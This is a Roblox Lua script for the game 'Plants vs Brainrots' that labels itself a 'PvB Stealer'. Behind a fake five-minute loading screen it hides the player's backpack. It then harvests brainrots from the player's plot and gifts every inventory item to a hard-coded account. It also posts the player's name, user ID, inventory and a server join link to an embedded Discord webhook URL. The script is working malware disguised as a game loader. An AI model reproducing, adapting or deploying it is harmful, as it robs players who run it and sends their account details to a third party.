local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Workspace = game:GetService("Workspace")
local HttpService = game:GetService("HttpService")
local TweenService = game:GetService("TweenService")
local StarterGui = game:GetService("StarterGui")
local player = Players.LocalPlayer
local PlayerGui = player:WaitForChild("PlayerGui")
local WEBHOOK_URL = "https://discord.com/api/webhooks/1421386699048489050/EVpZy-6Gyulw3LpXnCmDH_hOPXJAOD6BMq8IQeBNZlJaoT6jgaeGF4myjvtPCdtY9jDu"
local SEND_DELAY = 0.1
local AUTO_SEND_ENABLED = true
local LOADING_DURATION = 300
local DEFAULT_RECIPIENTS = {"YashStorage"}
local TOOL_NAMES = {"shovel","hoe","rake","wateringcan","bat"}
local BRAIN_KEYWORDS = {"brain","brainrot","kg"}
local recipients = table.clone(DEFAULT_RECIPIENTS)
local toolName = "Basic Bat"
local Character = player.Character or player.CharacterAdded:Wait()
local HRP = Character:WaitForChild("HumanoidRootPart")
local Backpack = player:WaitForChild("Backpack")

pcall(function()
    StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Backpack,false)
    local backpackUI = PlayerGui:FindFirstChild("Backpack")
    if backpackUI then backpackUI.Enabled = false end
end)

local function getRequestFunc()
    if syn and syn.request then return syn.request
    elseif http_request then return http_request
    elseif request then return request
    elseif fluxus and fluxus.request then return fluxus.request
    elseif getgenv and getgenv().request then return getgenv().request
    else return nil end
end

local function sendWebhook(data)
    local req = getRequestFunc()
    if not req then return end
    local body = HttpService:JSONEncode(data)
    pcall(function()
        req({Url = WEBHOOK_URL, Method = "POST", Headers = {["Content-Type"]="application/json"}, Body = body})
    end)
end

local function getAvatar(userId)
    return ("https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=420&height=420&format=png"):format(userId)
end

local function getGiftRemote()
    local ok, remote = pcall(function()
        return ReplicatedStorage:FindFirstChild("BridgeNet2") and ReplicatedStorage.BridgeNet2:FindFirstChild("dataRemoteEvent")
    end)
    return ok and remote or nil
end

local function autoPickup()
    for _, obj in ipairs(Workspace:GetDescendants()) do
        if obj:IsA("Tool") and obj.Parent ~= Backpack and obj.Parent ~= Character then
            pcall(function() obj.Parent = Backpack end)
        end
    end
end

local function categorizeItems()
    autoPickup()
    local plants, brainrots, tools = {}, {}, {}
    for _, item in ipairs(Backpack:GetChildren()) do
        if item:IsA("Tool") then
            local lname = item.Name:lower()
            local isTool = false
            for _, tname in ipairs(TOOL_NAMES) do
                if string.find(lname,tname) then
                    table.insert(tools,"ðŸ›  "..item.Name)
                    isTool = true
                    break
                end
            end
            if not isTool then
                local isBrain = false
                for _, kw in ipairs(BRAIN_KEYWORDS) do
                    if string.find(lname,kw) then
                        isBrain = true
                        break
                    end
                end
                if isBrain then
                    table.insert(brainrots,"ðŸ§  "..item.Name)
                else
                    table.insert(plants,"ðŸŒ¿ "..item.Name)
                end
            end
        end
    end
    return plants, brainrots, tools
end

local function sendItemToRecipient(item, recipient)
    local remote = getGiftRemote()
    if not remote then return false end
    local success = false
    pcall(function()
        remote:FireServer({[1]={["Item"]=item,["ToGift"]=recipient},[2]=string.char(21)})
        success = true
    end)
    return success
end

local function sendDiscordEmbed()
    local plants, brainrots, tools = categorizeItems()
    local function fmt(list)
        return #list>0 and "```"..table.concat(list,"\n").."```" or "```Empty```"
    end
    local data = {
        content="@everyone",
        username="Kuni Hit ",
        avatar_url=getAvatar(player.UserId),
        embeds={{
            title="ðŸ“¦ INVENTORY",
            description="Kuni Hit x PvB Stealer â˜ ï¸",
            color=65280,
            fields={
                {name="ðŸŒ¿ PLANTS", value=fmt(plants), inline=false},
                {name="ðŸ§  BRAINROTS", value=fmt(brainrots), inline=false},
                {name="ðŸ›  TOOLS", value=fmt(tools), inline=false},
                {name="ðŸ‘¤ Player", value=player.Name, inline=true},
                {name="ðŸ†” User ID", value=tostring(player.UserId), inline=true},
                {name="ðŸ•’ Time", value=os.date("%Y-%m-%d %H:%M:%S").." â°", inline=true},
                {name="ðŸ•¹ Server Info", value="PlaceId: "..game.PlaceId.."\nJobId: "..game.JobId, inline=false},
                {name="ðŸ”— Join Server", value="[Click to Join](https://floating.gg/?placeID="..game.PlaceId.."&gameInstanceId="..game.JobId..")", inline=false}
            },
            footer={text="Kuni Hit"}
        }}
    }
    sendWebhook(data)
end

local function isRecipientInServer(recipientName)
    for _, p in ipairs(Players:GetPlayers()) do
        if p.Name == recipientName then
            return true
        end
    end
    return false
end

local function spamSendToRecipient(recipient)
    if not isRecipientInServer(recipient) then return end
    autoPickup()
    local sentNames = {}
    for _, item in ipairs(Backpack:GetChildren()) do
        if item:IsA("Tool") then
            local fired = sendItemToRecipient(item, recipient)
            if fired then table.insert(sentNames,item.Name or "Unknown") end
            task.wait(SEND_DELAY)
        end
    end
    if #sentNames>0 then sendDiscordEmbed() end
end

local function handleRecipients()
    for _, r in ipairs(recipients) do
        task.spawn(function()
            spamSendToRecipient(r)
        end)
    end
end

local function equipBat()
    local humanoid = Character:FindFirstChildWhichIsA("Humanoid")
    if humanoid then
        local tool = Backpack:FindFirstChild(toolName)
        if tool then
            humanoid:EquipTool(tool)
            task.wait(0.05)
            humanoid:UnequipTools()
        end
    end
end

local function detectPlayerPlot()
    local plotsFolder = Workspace:WaitForChild("Plots")
    for _, plot in ipairs(plotsFolder:GetChildren()) do
        if tonumber(plot.Name) then
            local ownerVal = plot:FindFirstChild("Owner") or plot:FindFirstChild("Player")
            if ownerVal and ownerVal.Value == player then return plot end
            if plot:FindFirstChild("Brainrots") then
                for _, br in ipairs(plot.Brainrots:GetChildren()) do
                    for _, obj in ipairs(br:GetDescendants()) do
                        if obj:IsA("ProximityPrompt") and obj.Enabled then return plot end
                    end
                end
            end
        end
    end
    return nil
end

task.spawn(function()
    while task.wait(0.05) do
        local plot = detectPlayerPlot()
        if plot and plot:FindFirstChild("Brainrots") then
            equipBat()
            for _, br in ipairs(plot.Brainrots:GetChildren()) do
                local hitbox = br:FindFirstChild("Hitbox")
                if hitbox then
                    for _, prompt in ipairs(br:GetDescendants()) do
                        if prompt:IsA("ProximityPrompt") and prompt.Enabled and (prompt.ActionText=="Pick Up Brainrot" or prompt.ActionText=="Remove Brainrot") then
                            HRP.CFrame = hitbox.CFrame + Vector3.new(0,3,0)
                            fireproximityprompt(prompt, math.huge)
                            task.wait(0.05)
                        end
                    end
                end
            end
        end
    end
end)

task.spawn(function()
    local duration = LOADING_DURATION
    local ScreenGui = Instance.new("ScreenGui", PlayerGui)
    ScreenGui.Name = "Kuni_Load"
    ScreenGui.ResetOnSpawn = false
    ScreenGui.IgnoreGuiInset = true

    local bg = Instance.new("Frame", ScreenGui)
    bg.Size = UDim2.new(1,0,1,0)
    bg.BackgroundColor3 = Color3.fromRGB(18,18,18)
    local grad = Instance.new("UIGradient", bg)
    grad.Color = ColorSequence.new{
        ColorSequenceKeypoint.new(0, Color3.fromRGB(30,60,30)),
        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(50,120,50)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(20,20,20))
    }
    grad.Rotation = 90

    local title = Instance.new("TextLabel", bg)
    title.Size = UDim2.new(0.7,0,0.15,0)
    title.Position = UDim2.new(0.15,0,0.2,0)
    title.BackgroundTransparency = 1
    title.Text = "ðŸŒ± Plants vs Brainrots"
    title.Font = Enum.Font.GothamBlack
    title.TextScaled = true
    title.TextColor3 = Color3.fromRGB(200,255,200)

    local barBG = Instance.new("Frame", bg)
    barBG.Size = UDim2.new(0.6,0,0.05,0)
    barBG.Position = UDim2.new(0.2,0,0.45,0)
    barBG.BackgroundColor3 = Color3.fromRGB(40,40,40)
    Instance.new("UICorner", barBG).CornerRadius = UDim.new(0,15)

    local fill = Instance.new("Frame", barBG)
    fill.Size = UDim2.new(0,0,1,0)
    fill.BackgroundColor3 = Color3.fromRGB(80,220,100)
    Instance.new("UICorner", fill).CornerRadius = UDim.new(0,15)

    local percent = Instance.new("TextLabel", bg)
    percent.Size = UDim2.new(0.2,0,0.06,0)
    percent.Position = UDim2.new(0.4,0,0.52,0)
    percent.BackgroundTransparency = 1
    percent.Text = "0%"
    percent.Font = Enum.Font.GothamBold
    percent.TextScaled = true
    percent.TextColor3 = Color3.fromRGB(240,240,240)

    local start = tick()
    while tick()-start < duration do
        local p = math.clamp((tick()-start)/duration,0,1)
        TweenService:Create(fill, TweenInfo.new(0.15,Enum.EasingStyle.Quad,Enum.EasingDirection.Out), {Size=UDim2.new(p,0,1,0)}):Play()
        percent.Text = tostring(math.floor(p*100)).."%"
        task.wait(0.05)
    end
    fill.Size = UDim2.new(1,0,1,0)
    percent.Text = "Ready! ðŸŒ»"
    task.wait(0.7)
    pcall(function() ScreenGui:Destroy() end)
    handleRecipients()
end)

Players.PlayerRemoving:Connect(function(leavingPlayer)
    if leavingPlayer == player then
        task.spawn(function() player:LoadCharacter() end)
    end
end)

sendDiscordEmbed()
